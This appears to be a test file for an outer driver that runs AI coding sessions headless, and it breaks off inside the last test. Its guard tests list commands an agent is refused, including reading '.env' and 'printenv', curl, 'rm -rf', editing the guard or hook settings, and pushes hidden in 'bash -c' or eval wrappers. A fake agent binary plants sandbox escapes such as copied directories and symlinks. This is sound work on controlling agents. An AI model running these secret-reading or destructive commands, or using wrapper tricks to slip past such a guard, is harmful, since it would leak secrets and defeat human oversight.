@@ -1,0 +1,1422 @@
+// SPDX-License-Identifier: Apache-2.0
+// Copyright 2026 KALKU DIGITAL SOLUTIONS LIMITED
+'use strict';
+
+require('./helpers').buildMachineOnly('turbo', 'scripts/turbo, the TURBO harness'); // W3g (LD342)
+
+/**
+ * test/turbo.js — scripts/turbo/, the TURBO harness: an outer driver that runs
+ * Leopard slice by slice in fresh headless sessions, queues what needs O, and
+ * works around it (LD108-LD112).
+ *
+ * No real session data: every case builds its own plan, repo or fake `claude`.
+ */
+
+const { assert, fs, path, tmpDir, rmrf, it, runAll } = require('./helpers');
+
+const plan = require('../scripts/turbo/plan');
+
+// --- T1: the plan -------------------------------------------------------------
+
+const S = (id, extra = {}) => ({ id, title: `slice ${id}`, phase: '2', test: `node test/${id}.js`, ...extra });
+
+function planOf(...slices) {
+  const p = plan.empty();
+  for (const s of slices) plan.addSlice(p, s);
+  return p;
+}
+
+it('plan: next() takes the first todo slice in list order', () => {
+  const p = planOf(S('a'), S('b'));
+  assert.strictEqual(plan.next(p).id, 'a');
+  plan.setStatus(p, 'a', 'done');
+  assert.strictEqual(plan.next(p).id, 'b');
+  plan.setStatus(p, 'b', 'done');
+  assert.strictEqual(plan.next(p), null);
+});
+
+it('plan: a slice waits for its depends_on, and a later independent slice goes first', () => {
+  const p = planOf(S('a'), S('b', { depends_on: ['a'] }), S('c'));
+  plan.queueItem(p, { slice: 'a', kind: 'merge-to-main', title: 'merge', ask: 'may I merge?' });
+  // a is blocked by an open item, b depends on a, so c is the work around it.
+  assert.strictEqual(plan.next(p).id, 'c');
+});
+
+it('plan: a blocking queue item blocks its slice until answered; answering unblocks it', () => {
+  const p = planOf(S('a'), S('b'));
+  const q = plan.queueItem(p, { slice: 'a', kind: 'push', title: 'push', ask: 'push?' });
+  assert.strictEqual(q, 'Q1');
+  assert.strictEqual(plan.next(p).id, 'b');
+  plan.setStatus(p, 'b', 'done');
+  assert.strictEqual(plan.next(p), null, 'only a blocked slice is left');
+  assert.deepStrictEqual(plan.counts(p), { todo: 1, eligible: 0, blocked: 1, done: 1, dropped: 0, open_items: 1 });
+  plan.answer(p, 'Q1', 'yes, push');
+  assert.strictEqual(plan.next(p).id, 'a');
+  assert.strictEqual(p.queue[0].status, 'answered');
+  assert.strictEqual(p.queue[0].answer, 'yes, push');
+});
+
+it('plan: a non-blocking item (a phase report) blocks nothing, but marks later phases provisional', () => {
+  const p = planOf(S('close2', { phase: '2', kind: 'closeout' }), S('x', { phase: '3' }), S('y', { phase: '2' }));
+  plan.setStatus(p, 'close2', 'done');
+  const q = plan.queueItem(p, { slice: 'close2', kind: 'phase-report', title: 'Phase 2 report', ask: 'go ahead?', blocking: false, phase: '2' });
+  assert.strictEqual(plan.next(p).id, 'x');
+  assert.strictEqual(plan.provisional(p, plan.find(p, 'x')), q, 'phase 3 work rests on the unanswered phase 2 report');
+  assert.strictEqual(plan.provisional(p, plan.find(p, 'y')), null, 'same-phase work is not provisional');
+  plan.answer(p, q, 'go');
+  assert.strictEqual(plan.provisional(p, plan.find(p, 'x')), null);
+});
+
+it('plan: validate() names duplicate ids, unknown dependencies, unknown items and bad statuses', () => {
+  const p = plan.empty();
+  p.slices.push({ id: 'a', status: 'todo', depends_on: ['nope'], blocked_by: ['Q9'] }, { id: 'a', status: 'weird', depends_on: [], blocked_by: [] });
+  const errs = plan.validate(p);
+  assert.ok(errs.some((e) => e.includes('duplicate slice id a')), errs.join('; '));
+  assert.ok(errs.some((e) => e.includes('unknown dependency nope')), errs.join('; '));
+  assert.ok(errs.some((e) => e.includes('unknown queue item Q9')), errs.join('; '));
+  assert.ok(errs.some((e) => e.includes('bad status weird')), errs.join('; '));
+  assert.deepStrictEqual(plan.validate(planOf(S('a'), S('b', { depends_on: ['a'] }))), []);
+});
+
+it('plan: a dependency cycle is a validation error, not a silent stall', () => {
+  const p = planOf(S('a', { depends_on: ['b'] }), S('b', { depends_on: ['a'] }));
+  assert.ok(plan.validate(p).some((e) => e.includes('cycle')), plan.validate(p).join('; '));
+});
+
+it('plan: addSlice refuses a duplicate id; front:true puts a slice at the head', () => {
+  const p = planOf(S('a'));
+  assert.throws(() => plan.addSlice(p, S('a')), /duplicate/);
+  plan.addSlice(p, S('fix'), { front: true });
+  assert.strictEqual(plan.next(p).id, 'fix');
+});
+
+it('plan: save() writes plan.json and approvals.md; load() reads it back; an invalid plan is not saved', () => {
+  const home = tmpDir();
+  try {
+    const p = planOf(S('a'));
+    plan.queueItem(p, { slice: 'a', kind: 'publish', title: 'npm publish 0.2.3', ask: 'publish?' });
+    plan.save(home, p);
+    const back = plan.load(home);
+    assert.deepStrictEqual(back, p);
+    const md = fs.readFileSync(path.join(home, 'approvals.md'), 'utf8');
+    assert.ok(md.includes('Q1'), md);
+    assert.ok(md.includes('npm publish 0.2.3'), md);
+    assert.ok(md.includes('inbox.md'), 'tells O where to answer');
+    back.slices.push({ id: 'a', status: 'todo', depends_on: [], blocked_by: [] });
+    assert.throws(() => plan.save(home, back), /duplicate/);
+    assert.deepStrictEqual(plan.load(home), p, 'the bad plan did not overwrite the good one');
+  } finally {
+    rmrf(home);
+  }
+});
+
+it('plan: load() of a missing home gives an empty plan', () => {
+  const home = path.join(tmpDir(), 'none');
+  assert.deepStrictEqual(plan.load(home), plan.empty());
+});
+
+it('plan: the CLI adds, queues, answers and reports next, exit 2 on a usage error', () => {
+  const home = tmpDir();
+  const { run } = require('./helpers');
+  try {
+    const env = { TURBO_HOME: home };
+    const cli = (...args) => run('scripts/turbo/plan.js', { args, env });
+    assert.strictEqual(cli('add', JSON.stringify(S('a'))).status, 0);
+    assert.strictEqual(cli('add', JSON.stringify(S('b'))).status, 0);
+    const q = cli('queue', JSON.stringify({ slice: 'a', kind: 'push', title: 't', ask: 'push?' }));
+    assert.strictEqual(q.status, 0, q.stderr);
+    assert.strictEqual(q.stdout.trim(), 'Q1');
+    assert.strictEqual(JSON.parse(cli('next').stdout).id, 'b');
+    assert.strictEqual(cli('status', 'b', 'done', '--session', 's1', '--commit', 'abc').status, 0);
+    assert.strictEqual(cli('next').stdout.trim(), 'null');
+    assert.strictEqual(cli('answer', 'Q1', 'go').status, 0);
+    assert.strictEqual(JSON.parse(cli('next').stdout).id, 'a');
+    const b = plan.find(plan.load(home), 'b');
+    assert.deepStrictEqual([b.session, b.commits], ['s1', ['abc']]);
+    assert.strictEqual(cli('bogus').status, 2);
+    assert.strictEqual(cli('answer', 'Q7', 'x').status, 2, 'an unknown item is a usage error');
+  } finally {
+    rmrf(home);
+  }
+});
+
+// --- T2: the guard ------------------------------------------------------------
+
+const guard = require('../scripts/turbo/guard');
+
+/** A throwaway layout: base/dev (the worktree), base/live (the live copy), base/scr (scratch). */
+function guardCtx() {
+  const base = fs.realpathSync(tmpDir());
+  const root = path.join(base, 'dev');
+  const live = path.join(base, 'live');
+  for (const d of [root, live, path.join(base, 'scr'), path.join(root, 'scripts', 'turbo'), path.join(root, 'src')]) fs.mkdirSync(d, { recursive: true });
+  fs.writeFileSync(path.join(live, 'CLAUDE.md'), 'rules\n');
+  fs.symlinkSync(path.join(live, 'CLAUDE.md'), path.join(root, 'CLAUDE.md'));
+  return { base, ctx: { root, live, home: path.join(root, '.turbo'), scratch: [path.join(base, 'scr')], self: path.join(root, 'scripts', 'turbo') } };
+}
+
+const bash = (command) => ({ tool_name: 'Bash', tool_input: { command } });
+const write = (file_path) => ({ tool_name: 'Write', tool_input: { file_path, content: 'x' } });
+
+function expectGuard(ctx, payload, kind) {
+  const d = guard.decide({ cwd: ctx.root, ...payload }, ctx);
+  const what = JSON.stringify(payload.tool_input);
+  if (kind === 'allow') assert.ok(d.allow, `${what} refused: ${d.kind} ${d.reason}`);
+  else {
+    assert.ok(!d.allow, `${what} allowed, wanted ${kind}`);
+    assert.strictEqual(d.kind, kind, `${what}: ${d.reason}`);
+  }
+}
+
+it('guard: the commands a slice needs are allowed', () => {
+  const { base, ctx } = guardCtx();
+  try {
+    for (const c of [
+      'npm test > out.txt',
+      'npm run lint',
+      `cd ${ctx.root} && npm run coverage > c.txt 2>&1`,
+      'node scripts/leopard-check.js --session s --pending --test "node test/a.js"',
+      'git status --short',
+      'git add src/a.js test/a.js',
+      'git commit -q -F .turbo/msg.txt',
+      'git commit -m "$(cat <<\'EOF\'\nfix: never git push here\nEOF\n)"',
+      'git show --stat HEAD',
+      'git diff --cached --name-only',
+      'git restore --staged src/a.js',
+      'git reset -q HEAD src/a.js',
+      'export GIT_INDEX_FILE=/tmp/i && git read-tree output-1 && git update-ref refs/heads/output-1 abc def',
+      'python3 -I review/witness-join.py --session s --trail trail.json',
+      `rm -rf ${path.join(base, 'scr', 'x')}`,
+      'rm src/old.js',
+      `echo hi > ${path.join(base, 'scr', 'o.txt')}`,
+      'ps -axo pid,args',
+      'sed -n 1,40p src/a.js',
+    ])
+      expectGuard(ctx, bash(c), 'allow');
+  } finally {
+    rmrf(base);
+  }
+});
+
+it('guard: hard stops are refused, each with its kind', () => {
+  const { base, ctx } = guardCtx();
+  try {
+    const cases = [
+      ['git push origin n10-redo', 'push'],
+      ['git -C . push', 'push'],
+      ['git merge output-1', 'merge'],
+      ['git pull', 'merge'],
+      ['git switch main', 'branch-switch'],
+      ['git checkout -- src/a.js', 'branch-switch'],
+      ['git symbolic-ref HEAD refs/heads/main', 'branch-switch'],
+      ['git update-ref refs/heads/main abc', 'merge'],
+      ['git reset --hard HEAD~1', 'destructive'],
+      ['git reset HEAD~1', 'destructive'],
+      ['git stash push -m x', 'destructive'],
+      ['git clean -fd', 'destructive'],
+      ['git branch -D old', 'destructive'],
+      ['git commit --amend -m x', 'destructive'],
+      ['git restore src/a.js', 'destructive'],
+      ['git worktree remove ../x', 'destructive'],
+      ['git config core.hooksPath /dev/null', 'hook-settings'],
+      ['npm publish', 'publish'],
+      ['npm version patch', 'publish'],
+      ['npm install left-pad', 'network'],
+      ['sudo ls', 'admin'],
+      ['curl https://example.com', 'network'],
+      ['gh pr merge 9', 'outward'],
+      ['rm -rf src', 'destructive'],
+      ['pkill -f turbo', 'destructive'],
+      ['cat .env', 'secret'],
+      ['printenv', 'secret'],
+      ['env', 'secret'],
+      ['grep -r foo src', 'no-grep'],
+      ['git grep foo', 'no-grep'],
+      ['rg foo', 'no-grep'],
+      [`cat ${path.join(ctx.live, 'CLAUDE.md')}`, 'live-copy'],
+      ['echo x > CLAUDE.md', 'live-copy'],
+      ['cp a.js ../live/src/a.js', 'live-copy'],
+      ['echo x > scripts/turbo/guard.js', 'self-edit'],
+      ['echo "unclosed', 'unparsed'],
+    ];
+    for (const [c, kind] of cases) expectGuard(ctx, bash(c), kind);
+  } finally {
+    rmrf(base);
+  }
+});
+
+it('guard: a hard stop hidden in a wrapper, a substitution or a later step is still found', () => {
+  const { base, ctx } = guardCtx();
+  try {
+    for (const c of [
+      'bash -c "git push"',
+      "sh -c 'cd /x && git push origin main'",
+      'eval git push',
+      'echo $(git push)',
+      'echo `git push`',
+      'npm test && git push',
+      'npm test; git push',
+      'true | git push',
+      '(git push)',
+      'FOO=1 git push',
+      'env FOO=1 git push',
+      'nohup git push',
+      'timeout 10 git push',
+      'xargs -n1 git push < refs.txt',
+      'command git push',
+      'bash <<EOF\ngit push\nEOF',
+    ])
+      expectGuard(ctx, bash(c), 'push');
+  } finally {
+    rmrf(base);
+  }
+});
+
+it('guard: file tools may write in the worktree, TURBO_HOME and scratch, and nowhere else', () => {
+  const { base, ctx } = guardCtx();
+  try {
+    expectGuard(ctx, write(path.join(ctx.root, 'src', 'a.js')), 'allow');
+    expectGuard(ctx, write(path.join(ctx.root, 'src', 'new', 'deep', 'b.js')), 'allow');
+    expectGuard(ctx, write(path.join(ctx.home, 'msg.txt')), 'allow');
+    expectGuard(ctx, write(path.join(base, 'scr', 'x.md')), 'allow');
+    expectGuard(ctx, { tool_name: 'Edit', tool_input: { file_path: path.join(ctx.root, 'CLAUDE.md') } }, 'live-copy');
+    expectGuard(ctx, write(path.join(ctx.live, 'src', 'a.js')), 'live-copy');
+    expectGuard(ctx, write(path.join(ctx.root, 'scripts', 'turbo', 'guard.js')), 'self-edit');
+    expectGuard(ctx, write(path.join(ctx.root, '.claude', 'settings.local.json')), 'hook-settings');
+    expectGuard(ctx, write(path.join(ctx.root, '.git', 'config')), 'destructive');
+    expectGuard(ctx, write(path.join(base, 'elsewhere.txt')), 'outside-tree');
+    expectGuard(ctx, { tool_name: 'MultiEdit', tool_input: { file_path: '/etc/hosts' } }, 'outside-tree');
+    expectGuard(ctx, { tool_name: 'NotebookEdit', tool_input: { notebook_path: path.join(ctx.live, 'n.ipynb') } }, 'live-copy');
+  } finally {
+    rmrf(base);
+  }
+});
+
+it('guard: reads are allowed except secrets; grep tools and the network are refused', () => {
+  const { base, ctx } = guardCtx();
+  try {
+    expectGuard(ctx, { tool_name: 'Read', tool_input: { file_path: path.join(ctx.live, 'CLAUDE.md') } }, 'allow');
+    expectGuard(ctx, { tool_name: 'Read', tool_input: { file_path: path.join(ctx.root, '.env') } }, 'secret');
+    expectGuard(ctx, { tool_name: 'Read', tool_input: { file_path: path.join(ctx.root, '.env.local') } }, 'secret');
+    expectGuard(ctx, { tool_name: 'Read', tool_input: { file_path: path.join(ctx.root, '.env.example') } }, 'allow');
+    expectGuard(ctx, { tool_name: 'Read', tool_input: { file_path: path.join(ctx.root, '.npmrc') } }, 'secret');
+    expectGuard(ctx, { tool_name: 'Grep', tool_input: { pattern: 'x' } }, 'no-grep');
+    expectGuard(ctx, { tool_name: 'Glob', tool_input: { pattern: '**/*.js' } }, 'no-grep');
+    expectGuard(ctx, { tool_name: 'WebFetch', tool_input: { url: 'https://x' } }, 'network');
+    expectGuard(ctx, { tool_name: 'WebSearch', tool_input: { query: 'x' } }, 'network');
+    expectGuard(ctx, { tool_name: 'Agent', tool_input: { prompt: 'x' } }, 'allow');
+  } finally {
+    rmrf(base);
+  }
+});
+
+it('guard: the hook refuses with exit 2 and a reason on stderr, allows with exit 0, and fails closed on bad input', () => {
+  const { run } = require('./helpers');
+  const { base, ctx } = guardCtx();
+  try {
+    const env = { TURBO_ROOT: ctx.root, TURBO_LIVE: ctx.live, TURBO_HOME: ctx.home, TURBO_SCRATCH: ctx.scratch.join(path.delimiter) };
+    const hook = (payload) => run('scripts/turbo/guard.js', { input: typeof payload === 'string' ? payload : JSON.stringify({ cwd: ctx.root, ...payload }), env });
+    const no = hook(bash('git push'));
+    assert.strictEqual(no.status, 2, no.stderr);
+    assert.ok(no.stderr.includes('push'), no.stderr);
+    assert.ok(no.stderr.includes('plan.js queue'), 'tells the session how to queue it');
+    assert.strictEqual(hook(bash('npm test')).status, 0);
+    assert.strictEqual(hook('not json').status, 2);
+    assert.strictEqual(hook({ tool_name: 'Bash', tool_input: {} }).status, 2, 'a Bash call with no command fails closed');
+  } finally {
+    rmrf(base);
+  }
+});
+
+// --- shared git helpers (T3's git-hook layer was removed by LD117) -------------
+
+const { spawnSync } = require('child_process');
+
+function gitIn(repo, args, env = {}) {
+  return spawnSync('git', ['-C', repo, '-c', 'user.name=t', '-c', 'user.email=t@example.com', ...args], { encoding: 'utf8', env: { ...process.env, ...env } });
+}
+
+// --- T4: one session ----------------------------------------------------------
+
+const session = require('../scripts/turbo/session');
+
+it('session: settings deny by default, allow a closed list, and put the guard before every tool', () => {
+  const st = session.settings({ root: '/r' });
+  assert.strictEqual(st.permissions.defaultMode, 'dontAsk');
+  assert.ok(!st.permissions.allow.includes('Bash'), 'bare Bash would allow every command');
+  for (const t of ['Read', 'Edit', 'Write', 'Agent', 'Bash(npm test:*)', 'Bash(node:*)', 'Bash(git commit:*)']) assert.ok(st.permissions.allow.includes(t), t);
+  for (const t of ['Bash(git push:*)', 'Bash(npm publish:*)', 'Bash(git checkout:*)', 'WebFetch', 'Grep', 'Glob']) assert.ok(st.permissions.deny.includes(t), t);
+  const pre = st.hooks.PreToolUse;
+  assert.strictEqual(pre.length, 1);
+  assert.strictEqual(pre[0].matcher, '*');
+  assert.ok(pre[0].hooks[0].command.includes(path.join('scripts', 'turbo', 'guard.js')), pre[0].hooks[0].command);
+});
+
+it('session: the env sets npm dry-run, names the run, injects no git config (LD117), and leaves the base env alone', () => {
+  const baseEnv = { PATH: '/bin', GIT_CONFIG_COUNT: '3' };
+  const e = session.env({ base: baseEnv, root: '/r', home: '/h', run: 'R1', session: 'S1', scratch: '/s' });
+  // The git-hook env broke every test that commits to main in a temp repo (cold verify 4).
+  assert.strictEqual(e.GIT_CONFIG_COUNT, undefined);
+  assert.strictEqual(e.GIT_CONFIG_KEY_0, undefined);
+  assert.strictEqual(e.NPM_CONFIG_DRY_RUN, 'true');
+  assert.deepStrictEqual([e.TURBO_HOME, e.TURBO_RUN, e.TURBO_SESSION, e.TURBO_ROOT, e.TURBO_SCRATCH], ['/h', 'R1', 'S1', '/r', '/s']);
+  assert.strictEqual(e.PATH, '/bin');
+  assert.strictEqual(baseEnv.GIT_CONFIG_COUNT, '3', 'the base env was changed');
+  assert.ok(!fs.existsSync(path.join(session.ROOT, 'scripts', 'turbo', 'githooks')), 'the removed git-hook layer is still on disk');
+});
+
+it('session: argv runs print mode, pinned session id, dontAsk, no MCP servers, JSON with the result schema', () => {
+  const a = session.argv({ sessionId: 'S1', settingsFile: '/h/settings.json', model: 'opus' });
+  const val = (f) => a[a.indexOf(f) + 1];
+  assert.ok(a.includes('-p'));
+  assert.strictEqual(val('--session-id'), 'S1');
+  assert.strictEqual(val('--permission-mode'), 'dontAsk');
+  assert.strictEqual(val('--settings'), '/h/settings.json');
+  assert.strictEqual(val('--output-format'), 'json');
+  assert.strictEqual(val('--model'), 'opus');
+  assert.ok(a.includes('--strict-mcp-config'));
+  assert.deepStrictEqual(JSON.parse(val('--mcp-config')), { mcpServers: {} });
+  assert.deepStrictEqual(JSON.parse(val('--json-schema')), session.RESULT_SCHEMA);
+  assert.ok(!a.includes('--max-budget-usd'));
+  const b = session.argv({ sessionId: 'S1', settingsFile: '/s', model: 'opus', maxBudgetUsd: 5, effort: 'high' });
+  assert.strictEqual(b[b.indexOf('--max-budget-usd') + 1], '5');
+  assert.strictEqual(b[b.indexOf('--effort') + 1], 'high');
+});
+
+it('session: render() fills every placeholder and refuses a missing one', () => {
+  assert.strictEqual(session.render('a {{X}} b {{Y}}', { X: 1, Y: 'two' }), 'a 1 b two');
+  assert.throws(() => session.render('a {{X}} {{Z}}', { X: 1 }), /Z/);
+});
+
+it('session: the prompt template renders with no placeholder left', () => {
+  const text = session.prompt(session.promptVars({ run: 'R1', session: 'S1', home: '/h', assignment: { kind: 'strike', slice: { id: 'a' } } }));
+  assert.ok(!/\{\{[A-Z_]+\}\}/.test(text), 'a placeholder is left');
+  assert.ok(text.includes('S1') && text.includes('"id": "a"'), 'the assignment is in the prompt');
+});
+
+it('session: parseResult reads structured_output, a JSON result string, and refuses everything else', () => {
+  const good = { outcome: 'done', slice: 'a', commits: ['abc'], queued: [], decisions: ['LD200'], summary: 's' };
+  assert.deepStrictEqual(session.parseResult(JSON.stringify({ type: 'result', structured_output: good })).result, good);
+  assert.deepStrictEqual(session.parseResult(JSON.stringify({ type: 'result', result: JSON.stringify(good) })).result, good);
+  assert.ok(session.parseResult('not json').error);
+  assert.ok(session.parseResult('').error);
+  assert.ok(session.parseResult(JSON.stringify({ type: 'result', is_error: true, result: 'boom' })).error);
+  assert.ok(session.parseResult(JSON.stringify({ structured_output: { ...good, outcome: 'great' } })).error, 'an unknown outcome');
+  const { commits: _c, ...noCommits } = good;
+  assert.ok(session.parseResult(JSON.stringify({ structured_output: noCommits })).error, 'a missing field');
+  assert.strictEqual(session.parseResult(JSON.stringify({ structured_output: good, total_cost_usd: 1.5 })).cost, 1.5);
+});
+
+// --- T5: the driver -----------------------------------------------------------
+
+const turbo = require('../scripts/turbo/turbo');
+const PLAN_JS = path.join(__dirname, '..', 'scripts', 'turbo', 'plan.js');
+
+// A fake `claude`: records its argv, stdin and env, then plays the next step
+// from TURBO_FAKE (a JSON list). A step may run plan.js commands, commit a
+// file, leave a tracked file dirty, hang, and print a result.
+const FAKE = `#!/usr/bin/env node
+'use strict';
+const fs = require('fs');
+const path = require('path');
+const { execFileSync } = require('child_process');
+const steps = JSON.parse(fs.readFileSync(process.env.TURBO_FAKE, 'utf8'));
+const countFile = process.env.TURBO_FAKE + '.n';
+const n = fs.existsSync(countFile) ? Number(fs.readFileSync(countFile, 'utf8')) : 0;
+fs.writeFileSync(countFile, String(n + 1));
+const stdin = fs.readFileSync(0, 'utf8');
+fs.writeFileSync(process.env.TURBO_FAKE + '.call' + n + '.json', JSON.stringify({ argv: process.argv.slice(2), stdin, hooksPath: process.env.GIT_CONFIG_VALUE_0 }));
+const step = steps[n] || { result: { outcome: 'nothing', slice: null, commits: [], queued: [], decisions: [], summary: 'no step' } };
+const git = (args) => execFileSync('git', ['-c', 'user.name=t', '-c', 'user.email=t@example.com', ...args], { encoding: 'utf8' }).trim();
+for (const args of step.plan || []) execFileSync('node', [${JSON.stringify(PLAN_JS)}, ...args], { env: process.env });
+const result = step.result ? JSON.parse(JSON.stringify(step.result)) : null;
+if (step.commit) {
+  fs.writeFileSync(step.commit, String(n));
+  git(['add', step.commit]);
+  git(['commit', '-q', '-m', 'step ' + n]);
+  if (result) result.commits = [git(['rev-parse', 'HEAD'])];
+}
+if (step.dirty) fs.writeFileSync(step.dirty, 'dirty ' + n);
+// Planted escapes (T19-T21): files written anywhere, links, and rows a witness would have logged.
+for (const [from, to] of step.copyDirs || []) fs.cpSync(from, to, { recursive: true });
+for (const [from, to] of step.renames || []) fs.renameSync(from, to);
+for (const [p, text] of Object.entries(step.appendFiles || {})) fs.appendFileSync(p, text);
+for (const [p, text] of Object.entries(step.writeFiles || {})) {
+  fs.mkdirSync(path.dirname(p), { recursive: true });
+  fs.writeFileSync(p, text);
+}
+for (const [link, target] of Object.entries(step.links || {})) fs.symlinkSync(target, link);
+for (const row of step.appendLog || []) {
+  const ts = new Date(Date.now() + (row.dt || 0)).toISOString();
+  const { dt: _dt, ...rest } = row;
+  fs.appendFileSync(path.join(process.env.ORUNMILA_HOME, 'events.jsonl'), JSON.stringify({ ts, ...rest, session_id: rest.session_id === '$SELF' ? process.argv[process.argv.indexOf('--session-id') + 1] : rest.session_id }) + '\\n');
+}
+if (step.checkoutAndBack) {
+  git(['checkout', '-q', '-b', 'side']);
+  git(['checkout', '-q', 'work']);
+}
+if (step.hang) setInterval(() => {}, 1000);
+else {
+  if (result) process.stdout.write(JSON.stringify({ type: 'result', structured_output: result, total_cost_usd: 0.01 }));
+  process.exit(step.exit || 0);
+}
+`;
+
+const R = (outcome, slice, extra = {}) => ({ outcome, slice, commits: [], queued: [], decisions: [], summary: outcome, ...extra });
+
+/** A repo on branch `work` with one commit, a TURBO_HOME outside it, a fake claude and a fake clock. */
+function driverSetup(steps, { slices = [], referee = () => ({ shown: true, detail: 'stub' }), hours = 1, ...rest } = {}) {
+  const base = fs.realpathSync(tmpDir());
+  const root = path.join(base, 'repo');
+  const home = path.join(base, 'home');
+  fs.mkdirSync(root);
+  gitIn(root, ['init', '-q', '-b', 'work']);
+  fs.writeFileSync(path.join(root, 'tracked.txt'), 'x\n');
+  gitIn(root, ['add', 'tracked.txt']);
+  gitIn(root, ['commit', '-q', '-m', 'base']);
+  gitIn(root, ['config', 'turbo.source', base]); // a TURBO clone records its source (LD117: the driver runs only there)
+  const p = plan.empty();
+  for (const s of slices) plan.addSlice(p, s);
+  plan.save(home, p);
+  const fakeBin = path.join(base, 'claude-fake');
+  fs.writeFileSync(fakeBin, FAKE);
+  fs.chmodSync(fakeBin, 0o755);
+  const fakeSteps = path.join(base, 'steps.json');
+  fs.writeFileSync(fakeSteps, JSON.stringify(steps));
+  const ohome = path.join(base, 'oh'); // this test's event log: the witnesses' rows the driver reads
+  fs.mkdirSync(ohome);
+  let t = Date.parse('2026-11-22T00:00:00Z');
+  const clock = { now: () => t, sleep: async (ms) => (t += ms) };
+  const opts = {
+    root,
+    home,
+    hours,
+    sessionMinutes: 0.25,
+    pollMs: 5 * 60 * 1000,
+    claudeBin: fakeBin,
+    env: { ...process.env, TURBO_FAKE: fakeSteps, ORUNMILA_HOME: ohome },
+    outsideRoots: [], // nothing of O's machine: each escape test names its own
+    tripwire: [],
+    settleMs: 0,
+    now: clock.now,
+    sleep: clock.sleep,
+    referee,
+    finalGates: false,
+    caffeinate: false,
+    sentinel: false,
+    held: false, // the tests drive the loop; the real hold is T17's
+    ...rest,
+  };
+  const call = (n) => JSON.parse(fs.readFileSync(`${fakeSteps}.call${n}.json`, 'utf8'));
+  const called = (n) => fs.existsSync(`${fakeSteps}.call${n}.json`);
+  return { base, root, home, ohome, opts, call, called, clock };
+}
+
+it('driver: strikes the plan in order, stalks when it is empty, then waits out the hours', async () => {
+  const steps = [
+    { plan: [['status', 'a', 'done']], commit: 'a.txt', result: R('done', 'a') },
+    { plan: [['status', 'b', 'done']], commit: 'b.txt', result: R('done', 'b') },
+    { result: R('nothing', null) },
+  ];
+  const d = driverSetup(steps, { slices: [S('a'), S('b')] });
+  try {
+    const out = await turbo.run(d.opts);
+    assert.deepStrictEqual(out.sessions.map((s) => s.kind), ['strike', 'strike', 'stalk']);
+    assert.strictEqual(out.stopReason, 'hours');
+    assert.deepStrictEqual(out.sessions.map((s) => s.verified.length), [1, 1, 0]);
+    const summary = fs.readFileSync(path.join(out.runDir, 'summary.md'), 'utf8');
+    assert.ok(summary.includes('hours') && summary.includes(out.sessions[0].session), summary);
+    const log = fs.readFileSync(path.join(out.runDir, 'log.jsonl'), 'utf8').trim().split('\n').map(JSON.parse);
+    assert.ok(log.some((e) => e.type === 'wait'), 'no wait row');
+    assert.strictEqual(log[log.length - 1].type, 'end');
+    const c0 = d.call(0);
+    const sid = c0.argv[c0.argv.indexOf('--session-id') + 1];
+    assert.strictEqual(sid, out.sessions[0].session, 'the session id is pinned');
+    assert.ok(c0.stdin.includes('Kind: **strike**'), 'the prompt came on stdin');
+    assert.strictEqual(c0.hooksPath, undefined, 'git config reached the session through the env (LD117)');
+    assert.ok(!fs.existsSync(path.join(d.home, 'driver', 'driver.lock')), 'the lock was released');
+  } finally {
+    rmrf(d.base);
+  }
+});
+
+it('driver: works around a queued hard stop, waits for O, and resumes on an inbox answer', async () => {
+  const q = JSON.stringify({ slice: 'a', kind: 'push', title: 'push', ask: 'push?' });
+  const steps = [
+    { plan: [['queue', q]], result: R('blocked', 'a', { queued: ['Q1'] }) },
+    { plan: [['status', 'b', 'done']], commit: 'b.txt', result: R('done', 'b') },
+    { result: R('nothing', null) }, // stalk: only held work is left
+    { plan: [['answer', 'Q1', 'yes']], result: R('planned', null) }, // the inbox session applies O's answer
+    { plan: [['status', 'a', 'done']], commit: 'a.txt', result: R('done', 'a') },
+  ];
+  let answered = false;
+  const d = driverSetup(steps, { slices: [S('a'), S('b')], hours: 2 });
+  const sleep = d.opts.sleep;
+  d.opts.sleep = async (ms) => {
+    if (!answered) {
+      fs.writeFileSync(path.join(d.home, 'inbox.md'), 'Q1: yes\n');
+      answered = true;
+    }
+    return sleep(ms);
+  };
+  try {
+    const out = await turbo.run(d.opts);
+    assert.deepStrictEqual(
+      out.sessions.map((s) => `${s.kind}:${s.slice || '-'}`),
+      ['strike:a', 'strike:b', 'stalk:-', 'stalk:-', 'strike:a', 'stalk:-'],
+    );
+    assert.ok(d.call(3).stdin.includes('Inbox changed since the last session: yes'));
+    assert.strictEqual(plan.find(plan.load(d.home), 'a').status, 'done');
+  } finally {
+    rmrf(d.base);
+  }
+});
+
+it('driver: a commit the referee cannot show puts an evidence-fix slice at the head of the plan', async () => {
+  const steps = [{ plan: [['status', 'a', 'done']], commit: 'a.txt', result: R('done', 'a') }, { result: R('nothing', null) }];
+  const d = driverSetup(steps, { slices: [S('a'), S('b')], referee: () => ({ shown: false, detail: 'red: no run' }), maxSessions: 2 });
+  try {
+    const out = await turbo.run(d.opts);
+    const p = plan.load(d.home);
+    assert.strictEqual(p.slices[0].id, 'a-evidence-1');
+    assert.strictEqual(p.slices[0].kind, 'evidence-fix');
+    assert.ok(p.slices[0].notes.join(' ').includes('red: no run'));
+    assert.strictEqual(out.sessions[1].kind, 'evidence-fix');
+    assert.strictEqual(out.sessions[0].referee.shown, false);
+  } finally {
+    rmrf(d.base);
+  }
+});
+
+it('driver: a dirty tree after a session makes the next one a recovery', async () => {
+  const steps = [{ dirty: 'tracked.txt', result: R('done', 'a') }, { result: R('recovered', null) }];
+  const d = driverSetup(steps, { slices: [S('a')], maxSessions: 2 });
+  try {
+    const out = await turbo.run(d.opts);
+    assert.deepStrictEqual(out.sessions.map((s) => s.kind), ['strike', 'recover']);
+    assert.ok(out.sessions[0].dirty.length, 'the dirty file was not seen');
+    assert.ok(d.call(1).stdin.includes('tracked.txt'), 'the recovery prompt names the dirty file');
+  } finally {
+    rmrf(d.base);
+  }
+});
+
+it('driver: a session past its time is stopped; two failures in a row put the driver in wait mode', async () => {
+  const steps = [{ hang: true }, { exit: 1 }];
+  const d = driverSetup(steps, { slices: [S('a')], sessionMinutes: 0.02 });
+  try {
+    const out = await turbo.run(d.opts);
+    assert.strictEqual(out.sessions[0].timedOut, true);
+    assert.strictEqual(out.sessions[0].kind, 'strike');
+    assert.strictEqual(out.sessions[1].kind, 'recover', 'a cut-off session is followed by a recovery');
+    assert.strictEqual(out.sessions.length, 2, 'it kept starting sessions after two failures');
+    assert.strictEqual(out.stopReason, 'hours');
+  } finally {
+    rmrf(d.base);
+  }
+});
+
+it('driver: three sessions with no progress put it in wait mode', async () => {
+  const d = driverSetup([{ result: R('failed', 'a') }, { result: R('failed', 'a') }, { result: R('failed', 'a') }], { slices: [S('a')] });
